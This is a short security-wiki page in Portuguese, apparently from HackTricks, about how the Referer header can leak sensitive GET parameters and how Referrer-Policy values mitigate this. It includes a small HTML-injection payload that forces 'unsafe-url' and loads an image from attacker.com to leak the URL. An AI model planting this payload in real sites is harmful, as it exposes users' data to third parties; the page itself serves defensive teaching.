# HTTP interessante

{{#include ../banners/hacktricks-training.md}}

## Headers e política de Referrer

Referrer é o header usado pelos browsers para indicar qual foi a página visitada anteriormente.

### Sensitive information leaked

Se, em algum momento, dentro de uma página web, alguma informação sensível estiver localizada nos parâmetros de uma requisição GET, se a página contiver links para fontes externas ou se um atacante conseguir fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo atacante, seria possível exfiltrar a informação sensível contida na requisição GET mais recente.

### Mitigation

Você pode fazer com que o browser siga uma **Referrer-policy** que poderia **evitar** que as informações sensíveis fossem enviadas para outras web applications:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Contramedida

Você pode sobrescrever essa regra usando uma tag meta HTML (o atacante precisa explorar uma injeção de HTML):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defesa

Nunca coloque dados confidenciais dentro de parâmetros GET ou caminhos na URL.

{{#include ../banners/hacktricks-training.md}}
